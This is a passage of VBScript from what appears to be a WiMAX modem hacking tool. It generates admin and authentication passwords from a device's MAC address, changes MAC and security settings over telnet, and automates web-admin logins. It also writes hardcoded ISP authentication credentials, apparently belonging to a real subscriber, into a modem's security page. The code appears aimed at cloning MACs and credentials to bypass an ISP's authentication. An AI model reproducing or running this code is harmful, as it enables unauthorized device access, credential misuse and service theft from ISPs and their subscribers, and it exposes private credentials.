	macPass = generatePassword(macTogen)
	End if
	If chkEnable622mType.Checked = False Then 
	DisableSecuritySettingsElement
	inputUserId.value = "Please wait...."
	inputDomainPassword.value = "Please wait...."
	macPass = TestingMacOnlyGen("",Replace(macTogen,":",""))
	EnableSecuritySettingsElement
	End If
''	
'If macPass <> "invalid" Then		
'If chkEnable622mType.Checked = False Then 
'macPass = TestingMacOnlyGen("",Replace(macTogen,":",""))
'End If
'End If
''
''
	If macPass = "invalid" Or macPass = "NA"  Then
		inputUserId.value = " Invalid MAC"
		inputDomainPassword.value = " Invalid MAC"
		inputNai.value = " Invalid MAC"
		webUiAdminPassword.value =" Invalid MAC"
		changeMacOneOnly.Disabled = True
		btnWebAdmin.Disabled = True
		btnWebGUI.Disabled = True
		btnSetFrequency.Disabled = True
		DisableSecuritySettingsElement
		macPass = "invalid"
		Exit Sub
	Else
	''
		macPassOld = generatePassword(macTogen)
			If radiobtnDv235tS.checked Then
				inputUserId.value = "smart1_lancelot"
				inputDomainPassword.value = "smart1_lancelot"
				webUiAdminPassword.value = macPassOld
			Else
				inputUserId.value = macPass
				inputDomainPassword.value = macPass
				webUiAdminPassword.value = macPassOld
			End If
	''
	myNai=Replace(macTogen,":","")
	inputNai.value =UCase(myNai)
	changeMacOneOnly.Disabled = False
	btnWebAdmin.Disabled = False
	btnWebGUI.Disabled = False
	btnSetFrequency.Disabled = False
	EnableSecuritySettingsElement
	End If
Else
inputUserId.value = " Invalid MAC"
inputDomainPassword.value = " Invalid MAC"
inputNai.value = " Invalid MAC"
webUiAdminPassword.value =" Invalid MAC"
changeMacOneOnly.Disabled = True
btnWebAdmin.Disabled = True
btnWebGUI.Disabled = True
btnSetFrequency.Disabled = True
DisableSecuritySettingsElement
macPass = "invalid"
End If 
End Sub 

Sub clearFieldInGenerator (fieldToClear)
If fieldToClear = 1 Then
InputMacToGenPassword.value = ""
OutmacPassword.value = ""
Else
If fieldToClear = 2 Then
inputTextToEncodeDecode.value = "" 
outTextEncodeDecode.value = ""
End If
End If
End Sub 
Function copyToClipBoard(stringPass)
'strCopy = BasicTextArea.Value
document.parentwindow.clipboardData.SetData "text", stringPass
End Function
Sub getEncodeDecodeText(stringText)
If UserOption(0).Checked Then
outTextEncodeDecode.value =	base64encode(stringText)
Else
If UserOption(1).Checked Then
outTextEncodeDecode.value = base64decode(stringText)
End If
End If
End sub
Sub ChangeSecurityOnlyBtn
KillInternetExplorer
If radiobtnBm622i2011.checked Then
MsgBox "SORRY this option is NOT yet available on your CURRENT device!!!" & vbCr & vbLf & "Use CHANGE MAC instead...",4096 + 16,"NOT AVAILABLE!!!"
Exit Sub
End If
''
changeMACLog.value = "Status Idle....."
authUserNameSecOnly = ""
authUserPassSecOnly = ""
naiUserNameSecOnly = ""
currentMacChangeSec = Trim(inputChangeMacOne.value)
If radiobtnDv235tS.checked Then
authUserNameSecOnly = inputDomainPassword.value
authUserPassSecOnly = inputDomainPassword.value
naiUserNameSecOnly = inputNai.value & drpDwnNaiDomain.value
Else
authUserNameSecOnly = inputDomainPassword.value & drpDwnNaiDomain.value
authUserPassSecOnly = inputDomainPassword.value
naiUserNameSecOnly = inputNai.value & drpDwnNaiDomain.value
End If
''MsgBox  "Change Security Settings Only..." & vbCr & vbLf & "DEVICE MAC: " & currentMacChangeSec & vbCr & vbLf & "NAI: " & naiUserNameSecOnly & vbCr & vbLf & "Password: " & authUserPassSecOnly & vbCr & vbLf & "User ID: " & authUserNameSecOnly

''
Dim objShellInGenSec, ansBtnSec
Set objShellInGenSec = CreateObject("WScript.Shell")
ansBtnSec = objShellInGenSec.Popup("Change SECURITY Settings : Are you sure?"& vbCr & vbLf & vbCr & vbLf  &"IMPORTANT: Settings to apply (Please check). " & vbCr & vbLf & vbCr & vbLf &"DEVICE MAC::  " & currentMacChangeSec & vbCr & vbLf & "NAI::  " & naiUserNameSecOnly & vbCr & vbLf & "Password::  " & authUserPassSecOnly & vbCr & vbLf & "User ID::  " & authUserNameSecOnly & vbCr & vbLf  & vbCr & vbLf &"NOT SURE?,  Please ABORT! And use CHANGE MAC."  & vbCr & vbLf & "NOTE: You can modify following:" & vbCr & vbLf &  " - NAI, USERID, PASSWORD, DOMAIN"& vbCr & vbLf & vbCr & vbLf & "[OK] = CONTINUE NOW! " & vbCr & vbLf & "[Cancel] = ABORT!", 0, "Confirmation message...", 1 + 4096 + 48)
If (ansBtnSec = -1 OR ansBtnSec = 1)  Then
DisplayLogChangeMAConly "Change Security Settings: Operation started..."
Else 
DisplayLogChangeMAConly "Change Security Settings: Operation canceled..."
Exit Sub
End If
''
If radiobtnDv235tG.checked Or radiobtnDv235tS.checked Then
ClearTstCmndInOut
ConnectToTSTChangeSecurityOnlyDv235t currentMacChangeSec
Sleeper 1000
tstLogCmnd =  "TelnetOutPutCmnd.txt"
Sleeper 1000
If CheckTstLogFile (tstLogCmnd) = True Then	
DisplayLogChangeMAConly("DV235t: Changing Security process finished....")
DisplayLogChangeMAConly("DV235t: NOTE: Security settings must MATCH to your DEVICE current MAC...")
Else
DisplayLogChangeMAConly("DV235t: Changing Security process FAILED/CANCELED/ABORTED....")
DisplayLogChangeMAConly("DV235t: NOTE: Please Check your TELNET ADMIN access....")
End If
hdnStopProcessResult.value = "1"
Exit Sub
End If
pressOk
'Dim objShellInGen, ansBtn
'Set objShellInGen = CreateObject("WScript.Shell")
'ansBtn = objShellInGen.Popup("WARNING : Before you continue."& vbCr & vbLf & vbCr & vbLf  &"PLEASE CONFIRM first the MAC below. " & vbCr & vbLf &" - Device MAC is " & inputChangeMacOne.value & vbCr & vbLf  & vbCr & vbLf &"If NOT  please ABORT! And use CHANGE MAC."  & vbCr & vbLf & "NOTE: You can modify following:" & vbCr & vbLf &  " - NAI, USERID, PASSWORD, DOMAIN"& vbCr & vbLf & vbCr & vbLf & "[OK] = CONTINUE NOW! " & vbCr & vbLf & "[Cancel] = ABORT!", 0, "Confirmation message...", 1 + 4096 + 48)
'If (ansBtn = -1 OR ansBtn = 1)  Then
'changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Operation started..."
'TextAreaScrollBottom(changeMACLog.name) 
'Else 
'changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Operation canceled..."
'TextAreaScrollBottom(changeMACLog.name) 
'Exit Sub
'End If
Set objShellInGen = Nothing
Set ansBtn = Nothing
hdnStopMacProcess.value = "0"  'set stop process to 0 to continue
hdnStopProcessResult.value = "0"
If radiobtnBm622m2012.checked Then
ChangeSecurityOnlyBmSixToToM
Else
ChangeSecurityOnly
End If
''ChangeSecurityOnly
hdnStopProcessResult.value = "1"
End Sub
''
Sub ChangeFrequencyOnlyBtn
If radiobtnDv235tG.checked Or radiobtnDv235tS.checked Then
ClearTstCmndInOut
ConnectToTSTaddFreqDv235t
Sleeper 1000
tstLogCmnd =  "TelnetOutPutCmnd.txt"
Sleeper 1000
If CheckTstLogFile (tstLogCmnd) = True Then	
DisplayLogChangeMAConly("DV235t: Adding frequency process finished....")
DisplayLogChangeMAConly("DV235t: NOTE: frequency DUPLICATION is NOT CHECK!!!....")
Else
DisplayLogChangeMAConly("DV235t: Adding frequency process FAILED....")
DisplayLogChangeMAConly("DV235t: Please Check your TELNET ADMIN access....")
End If
Exit Sub
End if
KillInternetExplorer
If drpDwnFrequency.value = "Allglobe" Or drpDwnFrequency.value = "Allsmart" Then
MsgBox "SORRY this option is ONLY available to DV235t and ALIKE models!!!" & vbCr & vbLf & vbCr & vbLf  &"Other DEVICE support will be available SOON!!!. ", 64+4096 , "NOT AVAILABLE!!!"
Exit Sub
End If
If (Not radiobtnBm622.checked) AND (Not radiobtnBm6222011.checked) Then
MsgBox "SORRY this option is ONLY available to BM622 2011 and below!!!" & vbCr & vbLf & vbCr & vbLf  &"Other DEVICE support will be available SOON!!!. ", 64+4096 , "NOT AVAILABLE!!!"
Exit Sub
End If
pressOkFreq
Dim objShellInGen, ansBtn
Set objShellInGen = CreateObject("WScript.Shell")
ansBtn = objShellInGen.Popup("WARNING : Before you continue." & vbCr & vbLf & vbCr & vbLf  &"PLEASE CONFIRM first the MAC below. " & vbCr & vbLf & vbCr & vbLf &" - Device MAC is " & inputChangeMacOne.value & vbCr & vbLf  & vbCr & vbLf &"If NOT  please ABORT! And provide DEVICE MAC"  & vbCr & vbLf & "[OK] = CONTINUE NOW! " & vbCr & vbLf & "[Cancel] = ABORT!", 0, "Confirmation message...", 1 + 4096 + 48)
If (ansBtn = -1 OR ansBtn = 1)  Then
changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Operation started..."
TextAreaScrollBottom(changeMACLog.name) 
Else 
changeMACLog.value = changeMACLog.value & vbCr & vbLf & "Operation canceled..."
TextAreaScrollBottom(changeMACLog.name) 
Exit Sub
End If
Set objShellInGen = Nothing
Set ansBtn = Nothing
hdnStopMacProcess.value = "0"  'set stop process to 0 to continue
hdnStopProcessResult.value = "0"
ChangeFrequencyOnly
hdnStopProcessResult.value = "1"
End Sub
''
Sub EnableWeb622
hdnStopMacProcess.value = "0"  
hdnStopProcessResult.value = "0"
'MsgBox "Not yet TESTED"
'Exit Sub
changeMACLog.Value = ""
''Loop ping 120seconds
''MsgBox "Turn Of your Wimax BEFORE PRESSING OK and AFTER PRESSING OK TURN ON your WIMAX",,"Notification MEssage...."
MsgBox "Read FIRST the FILE 622hackDawFixHow.txt, FOUND inside the TOOL folder BEFORE you PRESS OK!!",,"WARNING MEssage...."
pingCountTest = 0
Do 
pingResult = False
pingResult = PingIpToScanCMD(inputTelnetHost.value)
Sleeper 100
pingCountTest = pingCountTest + 1

If hdnStopMacProcess.value = "1" Then
Sleeper(1000)
hdnStopProcessResult.value = "1"
DisplayLogChangeMAConly (vbCr & vbLf & "Stopping process....Ok!")
Exit Sub
End If
If pingResult = True Then
EnableWeb622ChangeWeb(1)
Exit Do
Else
changeMACLog.Value = "Trying To connect " & inputTelnetHost.value & "......."
DisplayLogChangeMAConly  "WARNING: DO IT AS FAST AS YOU CAN!!!!!"
End If
Loop While pingResult = False
''end loop


hdnStopProcessResult.value = "1"

End Sub
''
Sub EnableWeb622ChangeWeb(recoverOption)
Set IE = CreateObject("InternetExplorer.Application")
StartDate = Now
IE.AddressBar = False
IE.MenuBar = False
IE.Toolbar = False
IE.Visible = 1
IE.navigate "http://" & inputTelnetHost.value 
''On Error Resume Next
''Sleeper 1000

'checkIEstatLimit = 0
'Do While (IE.readyState <> 4)    
''Sleeper 5000  
'checkIEstatLimit = checkIEstatLimit + 1
'Sleeper 100 
'If IE.Document.ReadyState = "complete" Then
'Exit Do
'End If
'If checkIEstatLimit > 25 Then
'Exit Do
'End If
'Loop 

''Set setUserName = IE.document.getElementsByName("Login_Name")(0) ''Login_Name 
'Set setUserName = IE.document.getElementByID("txt_Username") 
'setUserName.Value = inputWebAdminUname.value ''"admin"

'If TestObjectUsername(IE,inputWebAdminUname.value) Then
'Set setUserName = IE.document.getElementByID("txt_Username") 
'setUserName.Value = inputWebAdminUname.value ''"admin"
'MsgBox "Found"
'Else
'MsgBox "Not found"
'End If
IsUsernameExist = False
checkCountName = 0
Do
checkCountName = checkCountName + 1
IsUsernameExist = False
IsUsernameExist = TestObjectUsername(IE,inputWebAdminUname.value)
If IsUsernameExist Then
Set setUserName = IE.document.getElementByID("txt_Username") 
setUserName.Value = inputWebAdminUname.value ''"admin"
'		MsgBox "Found"
'		Exit SUB
Else
If checkCountName = 3 Or checkCountName = 10 Then
IE.Refresh
ElseIf checkCountName = 15 Then
MsgBox "Login Username field not found. Please Try again...."
IE.Quit
Exit Sub
End If
'		MsgBox "Not found"
''Exit Do
End If
Sleeper 1000
Loop While IsUsernameExist = False

'IE.Stop 
'IE.Quit
'Exit Sub
''Set setPassword = IE.Document.getElementsByName("LoginPassword")(0) ''txt_Password
Set setPassword = IE.document.getElementByID("txt_Password")
setPassword.Value = webUiAdminPassword.value 
If radiobtnWebAdminCus.Checked Then
If inputWebAdminPassowrd.value <> Trim("[ Forbidden ]") Then
setPassword.Value = Trim(inputWebAdminPassowrd.value)
End If 
End If
'MsgBox  setPassword.Value
'Exit sub
Set setBtnLogin = IE.document.getElementByID("btnLogin")

setBtnLogin.click
Sleeper 800
secElapseTime= DateDiff("s", StartDate, Now)

If recoverOption = 1 THen

IE.Navigate2 "http://" & inputTelnetHost.value &"/html/application/acl.asp"
ElseIf recoverOption = 2 Then
IE.Navigate2 "http://" & inputTelnetHost.value &"/html/management/cfgfile.asp"
Else
DisplayLogChangeMAConly "Please select option recovery...."
End If
''Set setHttpWan = IE.document.getElementByID("httpwan")
''setHttpWan.Checked = True
''Sleeper 400
'Sleeper 3000
''Set getTabInfoBody = IE.document.body.innerHTML
''MsgBox getTabInfoBody
'Set setHttpWan = IE.document.getElementByID("ConfigForm").contentWindow.document.All("httpwan")
''Set setHttpWan = IE.Document.ConfigForm.contentWindow.document.getElementByID("httpwan")
'setHttpWan.Checked = True
'Sleeper 400

Sleeper 1000
If Err.Number = 0 Then
DisplayLogChangeMAConly "Please Check your TELNET and WAN ACCESS..If FAILED please try the procedure again.."
DisplayLogChangeMAConly "Please CHECK if your SYSTEM is NOT slow......"
Else
DisplayLogChangeMAConly "Problem in accessing device using INTERNET EXPLORER..... Please try Again!!!!"
DisplayLogChangeMAConly "And CHECK your TELNET HOST AGAIN in TELNET ACCOUNT TAB MENU..."
Set IE = Nothing
End If

If secElapseTime > 60 Then
FinalElapseTimeMin = Round((secElapseTime /60),2)'DateDiff("m", StartDate, Now)
DisplayLogChangeMAConly( " Elapse Time: " & FinalElapseTimeMin &" min(s)")
Else
FinalElapseTimeSec = secElapseTime
DisplayLogChangeMAConly( " Elapse Time: " & FinalElapseTimeSec &" sec(s)")
End If

End Sub
Sub WaitIEtoLoad(ieObject)
''Begin checkIE loaded
On Error Resume Next
checkIELoaded = 0
do until ieObject.readyState = 4 
Sleeper 1000
checkIELoaded = checkIELoaded + 1
If checkIELoaded = 5 Then
Exit do
End If
Loop
checkIELoaded = 0
''End checkIE loaded
''Sleeper 3000
End Sub 
''
''BEGIN bm622m test
Sub EnableWeb622mChangeWeb(recoverOption)
Set IE = CreateObject("InternetExplorer.Application")
StartDate = Now
IE.AddressBar = False
IE.MenuBar = False
IE.Toolbar = False
IE.Visible = 1
IE.navigate "http://" & inputTelnetHost.value &"/login.html"
On Error Resume Next
''begin login

WaitIEtoLoad(IE)

'Set setUserName = IE.document.getElementByID("txt_Username") 
'setUserName.Value = Trim(inputWebAdminUname.value) 
''
IsUsernameExist = False
checkCountName = 0
Do
checkCountName = checkCountName + 1
IsUsernameExist = False
IsUsernameExist = TestObjectUsername(IE,inputWebAdminUname.value)
If IsUsernameExist Then
DisplayLogChangeMAConly "Accessing Ok...." 	
DisplayLogIpscan "Login as USER: " & inputWebUserUname.value & "PASS: " & inputWebUserPassowrd.value
do until IE.readyState = 4 : Sleeper 1000 : loop
Sleeper 1000
Set setUserName = IE.document.getElementByID("txt_Username") 
setUserName.Value = Trim(inputWebUserUname.value) 
Sleeper 1000

Set setPassword = IE.document.getElementByID("txt_Password")
setPassword.Value = Trim(inputWebUserPassowrd.value)
Sleeper 2000
Exit Do
Else
If checkCountName = 3 Or checkCountName = 10 Or checkCountName = 15 Or checkCountName = 25 Then
IE.Refresh
ElseIf checkCountName = 35 Then
DisplayLogChangeMAConly "Sorry failed to ACCESS WEB ADMIN on " & inputTelnetHost.value &"...."
DisplayLogChangeMAConly "Problem in loading LOGIN page on " & inputTelnetHost.value &"...."
DisplayLogChangeMAConly "Try to load your Current MAC. If successfull, USE the CHANGE SECURITY button."
DisplayLogChangeMAConly "If you are USING ROUTER please REMOVE it and DIRECLY connect to WIMAX device." 
createTxtLogError changeMACLog.value  
IE.Quit
Sleeper 1000
Exit Sub
End If
If checkCountName = 17 Then
Sleeper 2000
Dim strTitle : strTitle = UCase(IE.Document.Title)
If InStr(strTitle, "CANNOT") <> 0 OR InStr(strTitle, "CAN'T") <> 0 Then 
''IE6,8,9''If InStr(strTitle, "CANNOT") <> 0 Then 
DisplayLogChangeMAConly "Sorry failed to ACCESS on " & inputTelnetHost.value &"...."
DisplayLogChangeMAConly "Webserver NOT FOUND on " & inputTelnetHost.value &"...."
DisplayLogChangeMAConly "Try to load your Current MAC. If successfull use CHANGE SECURITY button." 
DisplayLogChangeMAConly "If you are USING ROUTER please REMOVE it and DIRECLY connect to WIMAX device." 
createTxtLogError changeMACLog.value  
IE.Quit
Sleeper 1000
Exit Sub
End If
End If

'		MsgBox "Not found"
''Exit Do
End If
Sleeper 2000
Loop While IsUsernameExist = False
IsUsernameExist = False
checkCountName = 0
''
''On Error Resume Next
DisplayLogChangeMAConly "Logging-in...."
Set setBtnLogin = IE.document.getElementByID("btnLogin")
Sleeper 1000 
setBtnLogin.click
Sleeper 3000
checkCountTitle = 0
Do 
'IsURLValid = False
''DisplayLogChangeMAConly IE.Document.Title
Dim strTitleAfterLoginTst : strTitleAfterLoginTst = UCase(IE.Document.Title)
''isTitle = InStr(strTitleAfterLoginTst, "LOGIN") 
''DisplayLogChangeMAConly isTitle
stringResult = InStr(strTitleAfterLoginTst, "LOGIN") 
checkCountTitle = checkCountTitle + 1
If checkCountTitle = 2 Then
DisplayLogChangeMAConly "Waiting to login...."
End If 
''
If checkCountTitle = 8 Then
''IE.Refresh
DisplayLogChangeMAConly "Trying to RECOVER invalid login on " & inputTelnetHost.value &"...."
createTxtLogError changeMACLog.value
Sleeper 1000
IE.navigate "http://" & inputTelnetHost.value &"/login.html"
WaitIEtoLoad(IE)
IsUsernameExist = False
checkCountName = 0
Do
checkCountName = checkCountName + 1
IsUsernameExist = False
IsUsernameExist = TestObjectUsername(IE,inputWebAdminUname.value)
If IsUsernameExist Then
do until IE.readyState = 4 : Sleeper 1000 : loop
Set setUserName = IE.document.getElementByID("txt_Username") 
setUserName.Value = Trim(inputWebUserUname.value) 
Sleeper 1000

Set setPassword = IE.document.getElementByID("txt_Password")
setPassword.Value = Trim(inputWebUserPassowrd.value)
Sleeper 2000

Set setBtnLoginForTry = IE.document.getElementByID("btnLogin")
Sleeper 1000 
setBtnLoginForTry.click
Sleeper 2000
Exit Do
Else
If checkCountName = 3 Or checkCountName = 10 Or checkCountName = 15 Then
IE.Refresh
Sleeper 2000
ElseIf checkCountName = 25 Then
DisplayLogChangeMAConly "Sorry failed to ACCESS WEB ADMIN on " & inputTelnetHost.value &"...."
DisplayLogChangeMAConly "Problem in loading LOGIN page on " & inputTelnetHost.value &"...."
DisplayLogChangeMAConly "Try to load your Current MAC. If successfull, USE the CHANGE SECURITY button." 
DisplayLogChangeMAConly "If you are USING ROUTER please REMOVE it and DIRECLY connect to WIMAX device." 
createTxtLogError changeMACLog.value  
IE.Quit
Sleeper 1000
Exit Sub
End If
If checkCountName = 6 Then
Sleeper 2000
Dim strTitleTry : strTitleTry = UCase(IE.Document.Title)
If InStr(strTitleTry, "CANNOT") <> 0 OR InStr(strTitleTry, "CAN'T") <> 0 Then 
''IE6,8,9''If InStr(strTitle, "CANNOT") <> 0 Then 
DisplayLogChangeMAConly "Sorry failed to ACCESS on " & inputTelnetHost.value &"...."
DisplayLogChangeMAConly "Webserver NOT FOUND on " & inputTelnetHost.value &"...."
DisplayLogChangeMAConly "Try to load your Current MAC. If successfull use CHANGE SECURITY button." 
DisplayLogChangeMAConly "If you are USING ROUTER please REMOVE it and DIRECLY connect to WIMAX device." 
createTxtLogError changeMACLog.value  
IE.Quit
Sleeper 1000
Exit Sub
End If
End If
'		MsgBox "Not found"
''Exit Do
End If

Loop While IsUsernameExist = False
''
''On Error Resume Next

End If
''
Sleeper 5000 
If checkCountTitle > 12 Then
DisplayLogChangeMAConly "Sorry failed to ACCESS on " & inputTelnetHost.value &"...."
DisplayLogChangeMAConly "Access DENIED on " & inputTelnetHost.value &"...."
DisplayLogChangeMAConly "Tool Version: " & VersionAboutTool
createTxtLogError changeMACLog.value 
IE.Quit
Exit Sub
End If 
Loop While stringResult > 0
Sleeper 1000 
''end login

If recoverOption = 1 THen

IE.Navigate2 "http://" & inputTelnetHost.value &"/wimax/security.html"
ElseIf recoverOption = 2 Then
IE.Navigate2 "http://" & inputTelnetHost.value &"/html/management/cfgfile.asp"
Else
DisplayLogChangeMAConly "Please select option recovery...."
End If
do until IE.readyState = 4 : Sleeper 1000 : loop
Do
checkCountName = checkCountName + 1
IsSecurityExist = False
IsSecurityExist = TestObject622mSecurity(IE)
If IsSecurityExist Then
''MsgBox IsSecurityExist
'' Set TheForm = Document.forms("AUTH_form")
do until IE.readyState = 4 : Sleeper 1000 : loop
Set setSecurityNai = IE.document.getElementByID("_WMX_ANONYMOUS_ID")
setSecurityNai.value = "308730C681D7@globelines.com.ph"
Sleeper 1000
Set setSecurityPass = IE.document.getElementByID("_WMX_USER_NAME")
setSecurityPass.value = "2008u2IxCO_tHEZ8@globelines.com.ph"
Sleeper 1000
Set setSecurityFullPass = IE.document.getElementByID("_WMX_PASSW")
setSecurityFullPass.value = "2008u2IxCO_tHEZ8"
Sleeper 5000
set setBtnLogin = IE.document.getElementsByName("btnApply")
btnvalue = setBtnLogin(0).value
setBtnLogin(0).Click

DisplayLogChangeMAConly "values of btnApply is: " & btnvalue
'Sleeper 1000
'Set setFromToSubmit = IE.document.getElementByID("AUTH_form")
'setFromToSubmit.Submit
Exit Do 
ElseIf checkCountName = 20 Then
MsgBox IsSecurityExist
Exit Do
End If
Sleeper 2000
Loop While IsSecurityExist = False
IsSecurityExist = False
checkCountName = 0
''Set setHttpWan = IE.document.getElementByID("httpwan")
''setHttpWan.Checked = True
''Sleeper 400
'Sleeper 3000
''Set getTabInfoBody = IE.document.body.innerHTML
''MsgBox getTabInfoBody
'		Sleeper 30000
'		Set setHttpWan = IE.document.getElementByID("AUTH_form").contentWindow.document.All("_WMX_ANONYMOUS_ID")
'		setHttpWan.value = "testing@ako.com"
'		Sleeper 1000
'		Set setHttpWanA = IE.document.getElementByID("_WMX_ANONYMOUS_ID")
'		setHttpWanA.value = "testing1@ako2.com"
''Set setHttpWan = IE.Document.ConfigForm.contentWindow.document.getElementByID("httpwan")
'setHttpWan.Checked = True
'Sleeper 400

Sleeper 1000
If Err.Number = 0 Then
hdnStopProcessResult.value = "1"
DisplayLogChangeMAConly "Please Check your TELNET and WAN ACCESS..If FAILED please try the procedure again.."
DisplayLogChangeMAConly "Please CHECK if your SYSTEM is NOT slow......"
Else
DisplayLogChangeMAConly "Problem in accessing device using INTERNET EXPLORER..... Please try Again!!!!"
DisplayLogChangeMAConly "And CHECK your TELNET HOST AGAIN in TELNET ACCOUNT TAB MENU..."
Set IE = Nothing
hdnStopProcessResult.value = "1"
End If


End Sub
''
''END bm622m test
''
''
Function TestObjectCheckBtnLogin(ieObject)
On Error Resume Next
Set setBtnLogin = ieObject.document.getElementByID("btnLogin")
Sleeper 1000 
btnLoginString = setBtnLogin.innerHTML
btnLoginString = Replace(btnLoginString, vbCr, "")
btnLoginString = Replace(btnLoginString, vbLf, "")
''MsgBox btnLoginString
MyString = UCase(Trim(btnLoginString))
If MyString = "" Then
btnLoginString = "NOT FOUND"
Else 
btnLoginString = MyString
''MsgBox  MyString
If MyString <> "LOGIN" Then
MyArray = Split(MyString,"PT>", -1, 1)
btnLoginString = Trim(MyArray(1)) 
''Err.Clear
'	ElseIf MyString = "LOGIN" Then
'	btnLoginString = MyString
End If
End If
btnLoginStringUcase = btnLoginString'' UCase(btnLoginString)
''Duplicated login!
''MsgBox btnLoginStringUcase
''MsgBox "Error:" & Err.Number 
If Err.Number = 0 Then
''MsgBox "Instr: "& InStr(btnLoginStringUcase,"LOGIN")
If InStr(btnLoginStringUcase,"LOGIN") <> 0 Then
TestObjectCheckBtnLogin = True
Else
TestObjectCheckBtnLogin = False
Err.Clear
End If
Else 
TestObjectCheckBtnLogin = False
Err.Clear
End If 
End Function
''
''
Function TestObject622mSecurity(ieObject)
On Error Resume Next
'Set setCommentText = ieObject.document.getElementByID("AUTH_form").contentWindow.document.All("_WMX_ANONYMOUS_ID")
'setCommentText.Value = "testing lng"
Sleeper 5000
Set setSecurityNai = ieObject.document.getElementByID("_WMX_ANONYMOUS_ID")
setSecurityNai.value = "308730C681D7@globelines.com.ph"
Sleeper 5000
''
'Set setHttpWan = IE.document.getElementByID("AUTH_form").contentWindow.document.All("_WMX_ANONYMOUS_ID")
'setHttpWan.value = "testing@ako.com"
'Sleeper 1000
'Set setHttpWanA = IE.document.getElementByID("_WMX_ANONYMOUS_ID")
'setHttpWanA.value = "testing1@ako2.com"
''

If Err.Number = 0 Then
TestObject622mSecurity = True
Else 
TestObject622mSecurity = False
Err.Clear
End If 
End Function
''
Function TestObjectCommentText(ieObject)
On Error Resume Next
Set setCommentText = ieObject.document.getElementByID("commentText") 
setCommentText.Value = "testing lng"
If Err.Number = 0 Then
TestObjectCommentText = True
Else 
TestObjectCommentText = False
Err.Clear
End If 
End Function
''
Function TestObjectUsername(ieObject,username)
On Error Resume Next
Set setUserName = ieObject.document.getElementByID("txt_Username") 
setUserName.Value = username
If Err.Number = 0 Then
TestObjectUsername = True
Else 
TestObjectUsername = False
Err.Clear
End If 
End Function
''
Function TestObjectDuplicateLogin(ieObject)
On Error Resume Next
duplicateLogin = ieObject.document.getElementByID("err_info").innerHTML
duplicateLoginUcase = UCase(duplicateLogin)
''Duplicated login!
''MsgBox duplicateLogin
If Err.Number = 0 Then
If InStr(duplicateLoginUcase,"DUPLICATED") <> 0 Then
TestObjectDuplicateLogin = True
Else
TestObjectDuplicateLogin = False
Err.Clear
End If
Else 
TestObjectDuplicateLogin = False
Err.Clear
End If 
End Function

''
Function TestObjectFieldSetErrorSent(ieObject)
On Error Resume Next
fieldsetBody = ""
Set setFieldSet = ieObject.document.getElementsByTagName("fieldset") 
For Each Elem In setFieldSet
fieldsetBody = Elem.innerHTML
''MsgBox fieldsetBody
Next

fieldsetBodyUcase = UCase(fieldsetBody)
''Duplicated login!
''MsgBox duplicateLogin
If Err.Number = 0 Then
If InStr(fieldsetBodyUcase,"MESSAGE SENT") <> 0 Then
TestObjectFieldSetErrorSent = True
Else
TestObjectFieldSetErrorSent = False
Err.Clear
End If
Else 
TestObjectFieldSetErrorSent = False
Err.Clear
End If 
End Function
''
''
Function TestObjectFieldSetError(ieObject)
On Error Resume Next
fieldsetBody = ""
Set setFieldSet = ieObject.document.getElementsByTagName("fieldset") 
For Each Elem In setFieldSet
fieldsetBody = Elem.innerHTML
''MsgBox fieldsetBody
Next

fieldsetBodyUcase = UCase(fieldsetBody)
''Duplicated login!
''MsgBox duplicateLogin
If Err.Number = 0 Then
If InStr(fieldsetBodyUcase,"REFRESH") <> 0 Then
TestObjectFieldSetError = True
Else
TestObjectFieldSetError = False
Err.Clear
End If
Else 
TestObjectFieldSetError = False
Err.Clear
End If 
End Function
''
Function TestObjectScanFreq(ieObject)
On Error Resume Next
Set setFreq1 = ieObject.document.getElementByID("contentfrm").contentWindow.document.All("ExpertScanFreq1")
setFreq1.Value = drpDwnFrequency.value				
If Err.Number = 0 Then
TestObjectScanFreq = True
Else 
TestObjectScanFreq = False
Err.Clear
End If 
End Function
Function TestObjectSecurityBtn(ieObject)
On Error Resume Next
Set setSecurityBtn = ieObject.document.getElementByID("listfrm").contentWindow.document.All("link_Admin_4")
''IE6,8,9 ''Set setSecurityBtn = IE.document.frames("listfrm").document.All("link_Admin_4")
setSecurityBtn.click
If Err.Number = 0 Then
TestObjectSecurityBtn = True
Else 
TestObjectSecurityBtn = False
Err.Clear
End If 
End Function
Function TestObjectFrequencyBtn(ieObject)
On Error Resume Next
''
Set setScanSetBtn = ieObject.document.getElementByID("listfrm").contentWindow.document.All("link_Admin_4_1")
''IE6,8,9 ''Set setSecurityBtn = IE.document.frames("listfrm").document.All("link_Admin_4")
setScanSetBtn.click
''
If Err.Number = 0 Then
TestObjectFrequencyBtn = True
Else 
TestObjectFrequencyBtn = False
Err.Clear
End If 
End Function
Function TestObjectTTLS(ieObject)
On Error Resume Next
Set setTLS = ieObject.document.getElementByID("contentfrm").contentWindow.document.All("List_Auth")
Sleeper 500
setTLS.selectedIndex = 1
Sleeper 1000
setTLS.onchange
If Err.Number = 0 Then
TestObjectTTLS = True
Else 
TestObjectTTLS = False
Err.Clear
End If 
End Function
Function TestObjectTLS(ieObject)
On Error Resume Next
Set setTLS = ieObject.document.getElementByID("contentfrm").contentWindow.document.All("List_Auth")
Sleeper 500
setTLS.selectedIndex = 0
Sleeper 1000
setTLS.onchange
If Err.Number = 0 Then
TestObjectTLS = True
Else 
TestObjectTLS = False
Err.Clear
End If 
End Function
''
Function TestObjectDeviceInfoTable(ieObject)
On Error Resume Next
''Set setTableInfo = ieObject.document.getElementByID("contentfrm").contentWindow.document.body.innerHTML
''getTabInfoBody = ieObject.document.getElementByID("contentfrm").contentWindow.document.body.innerHTML
getTabInfoBody = ieObject.document.getElementByID("contentfrm").contentWindow.document.All("Device").innerHTML
Sleeper 1000
If Err.Number = 0 Then
If getTabInfoBody <> "" Then
getTabInfoBody = Replace(getTabInfoBody, vbCr, "")
getTabInfoBody = Replace(getTabInfoBody, vbLf, "")
getTabInfoBody = Replace(getTabInfoBody, "&nbsp;", " ")
getTabInfoBody = Replace(getTabInfoBody, "<", " ")
getTabInfoBody = Replace(getTabInfoBody, ">", " ")
Save2File getTabInfoBody, "savePage.txt"
Sleeper 1000
TestObjectDeviceInfoTable = True
Else
TestObjectDeviceInfoTable = False
Err.Clear
End If
Else 
TestObjectDeviceInfoTable = False
Err.Clear
End If 
End Function
''
''
Function TestObjectGetLoginForm(ieObject)
On Error Resume Next

''Set setTableInfo = ieObject.document.getElementByID("contentfrm").contentWindow.document.body.innerHTML
